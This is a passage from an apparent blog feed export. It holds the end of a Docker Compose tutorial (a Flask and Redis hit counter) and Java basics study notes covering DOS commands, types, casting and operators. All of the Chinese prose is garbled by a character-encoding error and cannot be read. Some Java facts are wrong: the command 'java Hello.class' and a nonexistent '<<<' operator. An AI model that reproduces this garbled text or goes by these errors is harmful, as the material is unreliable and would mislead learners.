class="keyword">if</span> retries == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">raise</span> exc</span><br><span class="line">            retries -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    count = get_hit_count()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! I have been seen &#123;&#125; times.\n&#x27;</span>.<span class="built_in">format</span>(count)</span><br></pre></td></tr></table></figure>

<p>åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ˜¯åº”ç”¨ç¨‹åºç½‘ç»œä¸Šçš„ redis å®¹å™¨çš„ä¸»æœºåï¼Œå¹¶ä½¿ç”¨<code>redis</code>é»˜è®¤ç«¯å£ã€‚<code>6379</code></p>
<blockquote>
<p><strong>ç¬”è®°</strong></p>
<p>è¯·æ³¨æ„å‡½æ•°çš„ç¼–å†™æ–¹å¼<code>get_hit_count</code>ã€‚å¦‚æœ Redis æœåŠ¡ä¸å¯ç”¨ï¼Œæ­¤åŸºæœ¬é‡è¯•å¾ªç¯ä¼šå¤šæ¬¡å°è¯•è¯·æ±‚ã€‚è¿™åœ¨åº”ç”¨ç¨‹åºä¸Šçº¿æ—¶å¯åŠ¨æ—¶å¾ˆæœ‰ç”¨ï¼Œä½†å¦‚æœåœ¨åº”ç”¨ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸå†…éœ€è¦éšæ—¶é‡æ–°å¯åŠ¨ Redis æœåŠ¡ï¼Œä¹Ÿä¼šä½¿åº”ç”¨ç¨‹åºæ›´å…·å¼¹æ€§ã€‚åœ¨é›†ç¾¤ä¸­ï¼Œè¿™ä¹Ÿæœ‰åŠ©äºå¤„ç†èŠ‚ç‚¹ä¹‹é—´çš„ç¬æ—¶è¿æ¥æ–­å¼€ã€‚</p>
</blockquote>
</li>
<li><p>åœ¨æ‚¨çš„é¡¹ç›®ç›®å½•ä¸­åˆ›å»ºå¦ä¸€ä¸ªåä¸ºçš„æ–‡ä»¶<code>requirements.txt</code>å¹¶ç²˜è´´ä»¥ä¸‹ä»£ç ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">flask</span><br><span class="line">redis</span><br></pre></td></tr></table></figure>
</li>
<li><p>åˆ›å»ºä¸€ä¸ª<code>Dockerfile</code>å¹¶ç²˜è´´ä»¥ä¸‹ä»£ç ï¼š</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># syntax=docker/dockerfile:1</span></span><br><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.10</span>-alpine</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /code</span></span><br><span class="line"><span class="keyword">ENV</span> FLASK_APP=app.py</span><br><span class="line"><span class="keyword">ENV</span> FLASK_RUN_HOST=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add --no-cache gcc musl-dev linux-headers</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt requirements.txt</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install -r requirements.txt</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5000</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;flask&quot;</span>, <span class="string">&quot;run&quot;</span>, <span class="string">&quot;--debug&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>é‡è¦çš„</strong></p>
<p>æ£€æŸ¥<code>Dockerfile</code>æ–‡ä»¶æ‰©å±•åæ˜¯å¦ä¸º<code>.txt</code>ã€‚æŸäº›ç¼–è¾‘å™¨å¯èƒ½ä¼šè‡ªåŠ¨é™„åŠ æ­¤æ–‡ä»¶æ‰©å±•åï¼Œä»è€Œå¯¼è‡´è¿è¡Œåº”ç”¨ç¨‹åºæ—¶å‡ºç°é”™è¯¯ã€‚</p>
</blockquote>
</li>
</ol>
<p>2ã€åœ¨Composeæ–‡ä»¶ä¸­å®šä¹‰æœåŠ¡</p>
<p>Compose ç®€åŒ–äº†æ•´ä¸ªåº”ç”¨ç¨‹åºå †æ ˆçš„æ§åˆ¶ï¼Œä½¿æ‚¨å¯ä»¥è½»æ¾åœ°åœ¨å•ä¸ªæ˜“äºç†è§£çš„ YAML é…ç½®æ–‡ä»¶ä¸­ç®¡ç†æœåŠ¡ã€ç½‘ç»œå’Œå·ã€‚</p>
<p>åœ¨æ‚¨çš„é¡¹ç›®ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºçš„æ–‡ä»¶<code>compose.yaml</code>å¹¶ç²˜è´´ä»¥ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8000:5000&quot;</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;redis:alpine&quot;</span></span><br></pre></td></tr></table></figure>

<p>è¯¥Composeæ–‡ä»¶å®šä¹‰äº†ä¸¤ä¸ªæœåŠ¡ï¼š<code>web</code>å’Œ<code>redis</code>ã€‚</p>
<p>è¯¥<code>web</code>æœåŠ¡ä½¿ç”¨ä»å½“å‰ç›®å½•ä¸­æ„å»ºçš„é•œåƒ<code>Dockerfile</code>ã€‚ç„¶åå®ƒå°†å®¹å™¨å’Œä¸»æœºç»‘å®šåˆ°å…¬å¼€ç«¯å£ã€‚<code>8000</code>æ­¤ç¤ºä¾‹æœåŠ¡ä½¿ç”¨ Flask Web æœåŠ¡å™¨çš„é»˜è®¤ç«¯å£<code>5000</code>ã€‚</p>
<p>è¯¥<code>redis</code>æœåŠ¡ä½¿ç”¨ ä» Docker Hub æ³¨å†Œè¡¨ä¸­æå–çš„å…¬å…±<a href="https://registry.hub.docker.com/_/redis/">Redisæ˜ åƒã€‚</a></p>
<p>3ã€ä½¿ç”¨ Compose æ„å»ºå¹¶è¿è¡Œæ‚¨çš„åº”ç”¨</p>
<p>ä½¿ç”¨å•ä¸ªå‘½ä»¤ï¼Œæ‚¨å¯ä»¥ä»é…ç½®æ–‡ä»¶åˆ›å»ºå¹¶å¯åŠ¨æ‰€æœ‰æœåŠ¡ã€‚</p>
<ol>
<li>ä»æ‚¨çš„é¡¹ç›®ç›®å½•ä¸­ï¼Œé€šè¿‡è¿è¡Œå¯åŠ¨æ‚¨çš„åº”ç”¨ç¨‹åº<code>docker compose up</code>ã€‚ã€</li>
<li>æ¯è®¿é—®ä¸€æ¬¡ç½‘ç«™ï¼Œæ¬¡æ•°åº”è¯¥éƒ½ä¼šå¢åŠ </li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Javaå­¦ä¹ ä¹‹æ—…</title>
    <url>/2024/09/14/Java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/</url>
    <content><![CDATA[<p>å­¦å­¦Javaå§ï¼</p>
<span id="more"></span>

<h1 id="ä¸€ã€Java-SEåŸºç¡€"><a href="#ä¸€ã€Java-SEåŸºç¡€" class="headerlink" title="ä¸€ã€Java SEåŸºç¡€"></a>ä¸€ã€Java SEåŸºç¡€</h1><p>â€‹	è¿™é‡Œå°±æ˜¯Javaå­¦ä¹ çš„å¼€å§‹ï¼Œä»è¿™å¼€å§‹æˆ‘çš„Javaå¤ä¹ ï¼Œä»¥åŠç¬”è®°æ•´ç†ä¹‹è·¯ã€‚</p>
<h2 id="è®¡ç®—æœºé¢„ç§‘"><a href="#è®¡ç®—æœºé¢„ç§‘" class="headerlink" title="è®¡ç®—æœºé¢„ç§‘"></a>è®¡ç®—æœºé¢„ç§‘</h2><p>â€‹	è¿™éƒ½æ˜¯æœ€åŸºç¡€çš„ï¼Œå¤§æ¦‚å°±æä¸€ä¸‹ã€‚</p>
<p>1ã€æ‰“å¼€CMD</p>
<p>2ã€ç®¡ç†å‘˜èº«ä»½è¿è¡ŒCMD</p>
<p>3ã€å¸¸è§çš„Doså‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd  åˆ‡æ¢è·¯å¾„</span><br><span class="line">dir æŸ¥çœ‹ç›®å½•</span><br><span class="line">exit  é€€å‡ºç»ˆç«¯</span><br><span class="line">ipconfig  æŸ¥çœ‹ç”µè„‘ipä¿¡æ¯</span><br><span class="line">calc  æ‰“å¼€è®¡ç®—å™¨</span><br><span class="line">mspaint  æ‰“å¼€ç”»å›¾</span><br><span class="line">notepad  æ‰“å¼€è®°äº‹æœ¬</span><br><span class="line">ping  å¯¹ç½‘ç«™å‘èµ·pingæ“ä½œ</span><br><span class="line">mdæˆ–mkdir  åˆ›å»ºæ–‡ä»¶å¤¹</span><br><span class="line">rmdiræˆ–rd  åˆ é™¤ç©ºç›®å½•</span><br><span class="line">del åˆ é™¤ç›®å½•æˆ–æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<h2 id="JavaåŸºç¡€"><a href="#JavaåŸºç¡€" class="headerlink" title="JavaåŸºç¡€"></a>JavaåŸºç¡€</h2><h3 id="1ã€Javaç®€ä»‹"><a href="#1ã€Javaç®€ä»‹" class="headerlink" title="1ã€Javaç®€ä»‹"></a>1ã€Javaç®€ä»‹</h3><ul>
<li><p>Javaçš„ç‰¹æ€§å’Œä¼˜åŠ¿</p>
<ul>
<li>ç®€å•æ€§</li>
<li>é¢å‘å¯¹è±¡</li>
<li>å¯ç§»æ¤æ€§</li>
<li>é«˜æ€§èƒ½</li>
<li>åˆ†å¸ƒå¼</li>
<li>åŠ¨æ€æ€§</li>
<li>å¤šçº¿ç¨‹</li>
<li>å®‰å…¨æ€§</li>
<li>å¥å£®æ€§</li>
</ul>
</li>
<li><p>Javaçš„ä¸‰å¤§ç‰ˆæœ¬</p>
<ul>
<li>JavaSEï¼š æ ‡å‡†ç‰ˆï¼ˆæ¡Œé¢ç¨‹åºã€æ§åˆ¶å°å¼€å‘â€¦â€¦ï¼‰</li>
<li>JavaMEï¼šåµŒå…¥å¼å¼€å‘ï¼ˆæ‰‹æœºã€åŠ ç‚¹â€¦..ï¼‰</li>
<li>JavaEEï¼šä¼ä¸šçº§å¼€å‘ï¼ˆWebç«¯ã€æœåŠ¡å™¨å¼€å‘â€¦â€¦ï¼‰</li>
</ul>
</li>
<li><p>Javaçš„å®‰è£…ä¸å¸è½½å¼€å‘ç¯å¢ƒï¼ˆè¿™ä¸ªç½‘ä¸Šéƒ½æœ‰çš„ï¼Œæœä¸‹å¾ˆå¤šï¼‰</p>
</li>
</ul>
<h3 id="2ã€Hello-World"><a href="#2ã€Hello-World" class="headerlink" title="2ã€Hello World"></a>2ã€Hello World</h3><ul>
<li>ä»£ç </li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!Java!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç›´æ¥é€šè¿‡javaå…ˆç¼–è¯‘ä¸ºå­—èŠ‚ç classæ–‡ä»¶å†æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac Hello.java           ---&gt;å¾—åˆ°Hello.class</span><br><span class="line">java Hello.class           ---&gt;Hello World!Java!</span><br></pre></td></tr></table></figure>

<ul>
<li><p>æ³¨é‡Š</p>
<p>javaä¸­çš„æ³¨é‡Šæœ‰ä¸‰ç§</p>
<ul>
<li>å•è¡Œæ³¨é‡Šï¼šåªèƒ½æ³¨é‡Šä¸€è¡Œæ–‡å­—   Ctrl  + &#x2F;</li>
<li>å¤šè¡Œæ³¨é‡Šï¼šå¯ä»¥æ³¨é‡Šä¸€æ®µæ–‡å­—  Ctrl  +  Shift +  &#x2F;</li>
<li>æ–‡æ¡£æ³¨é‡Šï¼šä¸€èˆ¬ç”¨äºè¡¨åæ–‡æ¡£åˆ›å»ºè€…ã€åˆ›å»ºæ—¥æœŸã€è¯´æ˜ç­‰</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//   å•è¡Œæ³¨é‡Š</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	å¤šè¡Œæ³¨é‡Š</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ–‡æ¡£æ³¨é‡Š</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="3ã€æ ‡è¯†ç¬¦å’Œå…³é”®å­—"><a href="#3ã€æ ‡è¯†ç¬¦å’Œå…³é”®å­—" class="headerlink" title="3ã€æ ‡è¯†ç¬¦å’Œå…³é”®å­—"></a>3ã€æ ‡è¯†ç¬¦å’Œå…³é”®å­—</h3><ul>
<li><p>æ ‡è¯†ç¬¦</p>
<ul>
<li>æ‰€æœ‰çš„æ ‡è¯†ç¬¦éƒ½åº”è¯¥ä»¥å­—æ¯ï¼Œ$ç¬¦å·æˆ–è€…ä¸‹åˆ’çº¿å¼€å§‹</li>
<li>ä¸èƒ½ä½¿ç”¨å…³é”®å­—ä½œä¸ºå˜é‡åæˆ–è€…æ–¹æ³•å</li>
<li>ä¸å»ºè®®ä½¿ç”¨ä¸­æ–‡æˆ–è€…æ‹¼éŸ³</li>
</ul>
</li>
<li><p>å…³é”®å­—</p>
<table>
<thead>
<tr>
<th>abstract</th>
<th>boolean</th>
<th>break</th>
<th>byte</th>
<th>case</th>
</tr>
</thead>
<tbody><tr>
<td>catch</td>
<td>char</td>
<td>const</td>
<td>class</td>
<td>continue</td>
</tr>
<tr>
<td>default</td>
<td>do</td>
<td>double</td>
<td>else</td>
<td>extends</td>
</tr>
<tr>
<td>final</td>
<td>finally</td>
<td>float</td>
<td>for</td>
<td>goto</td>
</tr>
<tr>
<td>if</td>
<td>implements</td>
<td>import</td>
<td>instanceof</td>
<td>int</td>
</tr>
<tr>
<td>interface</td>
<td>long</td>
<td>native</td>
<td>new</td>
<td>package</td>
</tr>
<tr>
<td>private</td>
<td>protected</td>
<td>public</td>
<td>return</td>
<td>short</td>
</tr>
<tr>
<td>static</td>
<td>strictfp</td>
<td>super</td>
<td>switch</td>
<td>this</td>
</tr>
<tr>
<td>throw</td>
<td>throws</td>
<td>transient</td>
<td>try</td>
<td>void</td>
</tr>
<tr>
<td>volatile</td>
<td>while</td>
<td>synchronized</td>
<td></td>
<td></td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="4ã€æ•°æ®ç±»å‹"><a href="#4ã€æ•°æ®ç±»å‹" class="headerlink" title="4ã€æ•°æ®ç±»å‹"></a>4ã€æ•°æ®ç±»å‹</h3><ul>
<li><p>é™æ€ç±»å‹è¯­è¨€</p>
<ul>
<li>å˜é‡å®šä¹‰æ—¶æœ‰ç±»å‹å£°æ˜çš„è¯­è¨€</li>
</ul>
</li>
<li><p>å¼ºç±»å‹è¯­è¨€</p>
<ul>
<li>å¼ºåˆ¶æ•°æ®ç±»å‹å®šä¹‰çš„è¯­è¨€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦ä¸€ä¸ªå˜é‡è¢«æŒ‡å®šäº†æŸä¸ªæ•°æ®ç±»å‹ï¼Œå¦‚æœä¸ç»è¿‡å¼ºåˆ¶è½¬æ¢ï¼Œé‚£ä¹ˆå®ƒå°±æ°¸è¿œæ˜¯è¿™ä¸ªæ•°æ®ç±»å‹äº†ã€‚</li>
</ul>
</li>
<li><p>æ•°æ®ç±»å‹åŸºæœ¬åˆ†ç±»</p>
<ul>
<li>åŸºæœ¬ç±»å‹<ul>
<li>æ•°å€¼ç±»å‹<ul>
<li>æ•´æ•°<ul>
<li>byte   1å­—èŠ‚   -128~127   ï¼ˆä¸€å­—èŠ‚å…«ä½ï¼‰</li>
<li>short  2å­—èŠ‚   -2^15~2^15-1</li>
<li>int       4å­—èŠ‚   -2^31~2^31-1</li>
<li>long    8å­—èŠ‚   -2^63~2^63-1</li>
</ul>
</li>
<li>æµ®ç‚¹æ•°<ul>
<li>float   4å­—èŠ‚</li>
<li>double   8å­—èŠ‚</li>
</ul>
</li>
<li>å­—ç¬¦<ul>
<li>char  2å­—èŠ‚</li>
</ul>
</li>
<li>å¸ƒå°”<ul>
<li>boolean  1ä½ åªæœ‰trueå’Œfalseä¸¤å€¼</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>å¼•ç”¨ç±»å‹<ul>
<li>ç±»</li>
<li>æ¥å£</li>
<li>æ•°ç»„</li>
</ul>
</li>
</ul>
</li>
<li><p>ä»€ä¹ˆæ˜¯å­—èŠ‚</p>
<ul>
<li>ä½ï¼ˆbitï¼‰ è®¡ç®—æœºå†…éƒ¨æ•°æ®å­˜å‚¨çš„æœ€å°å•ä½ï¼Œ 1011 1101æ˜¯ä¸€ä¸ªå…«ä½çš„äºŒè¿›åˆ¶æ•°</li>
<li>å­—èŠ‚ï¼ˆbyteï¼‰  æ˜¯è®¡ç®—æœºä¸­æ•°æ®å¤„ç†çš„åŸºæœ¬å•ä½ï¼Œä¹ æƒ¯ç”¨å¤§å†™Bè¡¨ç¤ºï¼Œ1Bï¼ˆbyteå­—èŠ‚ï¼‰ &#x3D;  8bitï¼ˆä½ï¼‰</li>
<li>å­—ç¬¦ï¼šæ˜¯æŒ‡è®¡ç®—æœºä¸­ä½¿ç”¨çš„å­—æ¯ã€æ•°å­—ã€å­—å’Œç¬¦å·ã€‚<ul>
<li>1bitè¡¨ç¤º1ä½</li>
<li>1Byteè¡¨ç¤ºä¸€ä¸ªå­—èŠ‚1B&#x3D;8b</li>
<li>1024B&#x3D;1KB</li>
<li>1024KB&#x3D;1M</li>
<li>1024M&#x3D;1G</li>
</ul>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>æ•°æ®ç±»å‹æ‹“å±•</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ä¸åŒè¿›åˆ¶çš„è¡¨ç¤º</span></span><br><span class="line"><span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">010</span>;   <span class="comment">// å…«è¿›åˆ¶0</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0x10</span>;  <span class="comment">// åå…­è¿›åˆ¶0x</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è½¬ä¹‰å­—ç¬¦</span></span><br><span class="line"><span class="comment">// \t   åˆ¶è¡¨ç¬¦</span></span><br><span class="line"><span class="comment">// \n   æ¢è¡Œ</span></span><br></pre></td></tr></table></figure>

<h3 id="5ã€ç±»å‹è½¬æ¢"><a href="#5ã€ç±»å‹è½¬æ¢" class="headerlink" title="5ã€ç±»å‹è½¬æ¢"></a>5ã€ç±»å‹è½¬æ¢</h3><ul>
<li><p>ç”±äºJavaæ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œæ‰€ä»¥åœ¨è¿›è¡ŒæŸäº›è¿ç®—çš„æ—¶å€™ï¼Œéœ€è¦è¿›è¡Œå¯¹åº”çš„ç±»å‹è½¬æ¢</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ä½ ------------------------------------------------&gt; é«˜</span><br><span class="line"><span class="type">byte</span> -&gt; <span class="type">short</span> -&gt; <span class="type">char</span> -&gt; <span class="type">int</span> -&gt; <span class="type">long</span> -&gt; <span class="type">float</span> -&gt; <span class="type">double</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>è¿ç®—ä¸­ï¼Œä¸åŒç±»å‹çš„æ•°æ®å…ˆè½¬åŒ–ä¸ºç»Ÿä¸€ç±»å‹åœ¨è¿›è¡Œè¿ç®—</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¼ºåˆ¶ç±»å‹è½¬æ¢</span></span><br><span class="line">(<span class="type">int</span>)<span class="number">12.3</span> ---&gt; <span class="number">12</span></span><br><span class="line">(<span class="type">double</span>)<span class="number">12</span>  ----&gt;  <span class="number">12.00</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">// ä¸è¿‡è¦æ³¨æ„æ•°æ®ç±»å‹çš„å¤§å°ï¼Œé˜²æ­¢å†…å­˜æº¢å‡ºçš„å‡ºç°</span></span><br><span class="line"><span class="comment">// JDK7æ–°ç‰¹æ€§ï¼Œæ•°å­—ä¹‹é—´å¯ä»¥ç”¨ä¸‹åˆ’çº¿åˆ†å‰²</span></span><br><span class="line"><span class="type">int</span> <span class="variable">money</span> <span class="operator">=</span> <span class="number">10_0000_0000</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6ã€å˜é‡ä¸å¸¸é‡"><a href="#6ã€å˜é‡ä¸å¸¸é‡" class="headerlink" title="6ã€å˜é‡ä¸å¸¸é‡"></a>6ã€å˜é‡ä¸å¸¸é‡</h3><ul>
<li>å˜é‡ï¼šå¯ä»¥å˜åŒ–çš„é‡ </li>
<li>Javaæ˜¯ä¸€ç§å¼ºç±»å‹è¯­è¨€ï¼Œæ¯ä¸ªå˜é‡éƒ½è¦ç”³æ˜å…¶æ•°æ®ç±»å‹</li>
<li>Javaå˜é‡æ˜¯ç¨‹åºä¸­æœ€åŸºæœ¬çš„å­˜å‚¨å•å…ƒï¼Œå…¶è¦ç´ åŒ…æ‹¬å˜é‡åã€å˜é‡ç±»å‹å’Œä½œç”¨åŸŸ</li>
<li>æ¯ä¸ªå˜é‡éƒ½å¿…é¡»è¦æœ‰å¯¹åº”çš„ç±»å‹ï¼Œå¯ä»¥ä½¿åŸºæœ¬ç±»å‹ä¹Ÿå¯ä»¥æ˜¯å¼•ç”¨ç±»å‹</li>
<li>å˜é‡åå¿…é¡»æ˜¯åˆæ³•çš„æ ‡è¯†ç¬¦</li>
<li>å˜é‡å£°æ˜éœ€è¦ä»¥åˆ†å·ç»“å°¾</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç±»å˜é‡ static</span></span><br><span class="line"><span class="keyword">static</span> <span class="type">double</span> <span class="variable">salary</span> <span class="operator">=</span> <span class="number">2500</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ä¾‹å˜é‡:ä»å±äºå¯¹è±¡ï¼šå®ä¾‹å˜é‡ï¼šä»å±äºå¯¹è±¡ï¼›å¦‚æœä¸è‡ªè¡Œåˆå§‹åŒ–ï¼Œè¿™ä¸ªç±»å‹çš„é»˜è®¤å€¼ 0 0.0</span></span><br><span class="line"><span class="comment">// å¸ƒå°”å€¼ï¼šé»˜è®¤æ˜¯ faLse</span></span><br><span class="line"><span class="comment">// é™¤äº†åŸºæœ¬ç±»å‹ï¼Œå…¶ä½™çš„éƒ½æ˜¯null</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å˜é‡çš„ä¸€äº›å‘½åè§„èŒƒï¼ˆä½¿ä½ çš„ä»£ç æ›´åŠ è§„èŒƒåŒ–ï¼‰<ul>
<li>æ‰€æœ‰å˜é‡ã€æ–¹æ³•ã€ç±»åï¼šè§åå¦‚æ„ï¼ˆå¯ä»¥é‡‡ç”¨è‹±æ–‡å‘½åï¼‰</li>
<li>ç±»æˆå‘˜å˜é‡ï¼šé¦–å­—æ¯å°å†™å’Œé©¼å³°åŸåˆ™ï¼šmonthSalary</li>
<li>å±€éƒ¨å˜é‡ï¼šé¦–å­—æ¯å°å†™å’Œé©¼å³°åŸåˆ™</li>
<li>å¸¸é‡ï¼šå¤§å†™å­—æ¯åŠ ä¸‹åˆ’çº¿ï¼šMAX_VALUE</li>
<li>ç±»åï¼šé¦–å­—æ¯å¤§å†™åŠ é©¼å³°åŸåˆ™ï¼šManï¼ŒGoodMan</li>
<li>æ–¹æ³•åï¼šé¦–å­—æ¯å°å†™å’Œé©¼å³°åŸåˆ™ï¼šrunRun()</li>
</ul>
</li>
</ul>
<h3 id="7ã€åŸºæœ¬è¿ç®—ç¬¦"><a href="#7ã€åŸºæœ¬è¿ç®—ç¬¦" class="headerlink" title="7ã€åŸºæœ¬è¿ç®—ç¬¦"></a>7ã€åŸºæœ¬è¿ç®—ç¬¦</h3><blockquote>
<p>Javaæ”¯æŒå¦‚ä¸‹è¿ç®—ç¬¦</p>
</blockquote>
<ul>
<li><p>ç®—æœ¯è¿ç®—ç¬¦ï¼š+ï¼Œ-ï¼Œ*ï¼Œ&#x2F;ï¼Œ%ï¼Œ++ï¼Œâ€“</p>
</li>
<li><p>èµ‹å€¼è¿ç®—ç¬¦: &#x3D;</p>
</li>
<li><p>å…³ç³»è¿ç®—ç¬¦ï¼š&gt;ï¼Œâ‰¤ï¼Œ&gt;&#x3D;ï¼Œ&lt;&#x3D;ï¼Œ&#x3D;&#x3D;ï¼Œ!&#x3D;ï¼Œ instanceof</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">instanceofæ˜¯Javaä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ï¼Œå·¦è¾¹æ˜¯å¯¹è±¡ï¼Œå³è¾¹æ˜¯ç±»ï¼›å½“å¯¹è±¡æ˜¯å³è¾¹ç±»æˆ–å­ç±»æ‰€åˆ›å»ºå¯¹è±¡æ—¶ï¼Œè¿”å›trueï¼›å¦åˆ™ï¼Œè¿”å›falseã€‚</span><br></pre></td></tr></table></figure>
</li>
<li><p>é€»è¾‘è¿ç®—ç¬¦ï¼š&amp;&amp;ï¼Œâ€–ï¼Œ!</p>
</li>
<li><p>ä½è¿ç®—ç¬¦ï¼š&amp;ï¼Œ|ï¼Œ~ï¼Œ^ï¼Œ&gt;&gt;ï¼Œ&lt;&lt;ï¼Œ&gt;&gt;&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;ï¼šæŒ‰ä½ä¸</span><br><span class="line">|ï¼šæŒ‰ä½æˆ–</span><br><span class="line">~ï¼šæŒ‰ä½é</span><br><span class="line">^ï¼šæŒ‰ä½å¼‚æˆ–</span><br><span class="line">&lt;&lt;ï¼šå·¦ä½ç§»è¿ç®—ç¬¦</span><br><span class="line">&gt;&gt;ï¼šå³ä½ç§»è¿ç®—ç¬¦</span><br><span class="line">&lt;&lt;&lt;ï¼šæ— ç¬¦å·å·¦ç§»è¿ç®—ç¬¦</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ¡ä»¶è¿ç®—ç¬¦: ï¼Ÿï¼š</p>
</li>
<li><p>æ‰©å±•èµ‹å€¼è¿ç®—ç¬¦ï¼š+&#x3D;ï¼Œ-&#x3D;ï¼Œ*&#x3D;ï¼Œ&#x2F;&#x3D;</p>
</li>
</ul>
<h3 id="8ã€è‡ªå¢è‡ªå‡è¿ç®—ç¬¦ã€åˆå§‹Mathç±»"><a href="#8ã€è‡ªå¢è‡ªå‡è¿ç®—ç¬¦ã€åˆå§‹Mathç±»" class="headerlink" title="8ã€è‡ªå¢è‡ªå‡è¿ç®—ç¬¦ã€åˆå§‹Mathç±»"></a>8ã€è‡ªå¢è‡ªå‡è¿ç®—ç¬¦ã€åˆå§‹Mathç±»</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a++ ä¸  ++açš„åŒºåˆ«</span><br><span class="line"><span class="comment">// ++åœ¨å‰è¡¨ç¤ºå…ˆ+1å†å»æ‰§è¡Œä»£ç   åœ¨ååˆ™æ˜¯ç›¸å</span></span><br><span class="line"><span class="comment">// --ä¹Ÿæ˜¯åŒç†</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>Mathç±»çš„ä¸€äº›å¸¸è§ç”¨æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Math.abs(a)ï¼šå–açš„ç»å¯¹å€¼</span><br><span class="line">Math.sqrt(a)ï¼šå–açš„å¹³æ–¹æ ¹</span><br><span class="line">Math.cbrt(a)ï¼šå–açš„ç«‹æ–¹æ ¹</span><br><span class="line">Math.max(a,b)ï¼šå–aã€bä¹‹é—´çš„æœ€å¤§å€¼</span><br><span class="line">Math.min(a,b)ï¼šå–aã€bä¹‹é—´çš„æœ€å°å€¼</span><br><span class="line">Math.pow(a,b)ï¼šå–açš„bå¹³æ–¹</span><br></pre></td></tr></table></figure></li>
</ul>
